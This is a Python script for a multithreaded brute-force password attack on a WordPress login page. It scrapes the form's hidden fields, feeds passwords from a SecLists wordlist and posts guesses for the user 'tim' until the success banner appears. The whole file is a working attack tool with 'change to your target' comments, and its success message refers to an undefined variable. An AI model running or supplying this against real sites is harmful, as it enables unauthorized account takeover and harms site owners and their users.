from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time

SUCCESS = 'Welcome to WordPress!' # We check for this string to see if an attempt was successful
TARGET = "http://boodelyboo.com/wordpress/wp-login.php" # Change to your target url. We download this form to parse the input variables.
WORDLIST = '/usr/share/seclists/Passwords/Software/cain-and-abel.txt' # Change to desired wordlist location.

def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()

    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words

def get_params(content): # Receives the HTTP response content, parses it, and loops through input elements to create a dictionary.
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall('//input'): # Find all input elements.
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params

class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'\nBrute Force Attack beginning on {url}.\n')
        print("Finished the setup where username = %s\n" % username)

    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args= (passwords,))
            t.start()

    def web_bruter(self, passwords):
        session = requests.Session() # Initialize a Session object from the requests library to handle cookies.
        resp0 = session.get(self.url)
        params = get_params(resp0.content) # Use get_params to set params from dictionary.
        params['log'] = self.username

        while not passwords.empty() and not self.found: # Loop through the passwords to find a valid cred.
            time.sleep(5)
            passwd = passwords.get()
            print(f'Trying username/password {self.username}/{passwd:<10}')
            params['pwd'] = passwd

            resp1 = session.post(self.url, data=params) # Post the requests with our params dictionary.
            if SUCCESS in resp1.content.decode(): # Check it it worked.
                self.found = True
                print(f"\nBruteforcing successful.")
                print("Username is %s" % self.username)
                print("Password is %s\n" % brute)
                print('Done: now cleaning up other threads...')

if __name__ == '__main__':
    words = get_words()
    b = Bruter('tim', TARGET) # Change 'tim' to any user you've found through enumeration or a guess (good luck...).
    b.run_bruteforce(words)
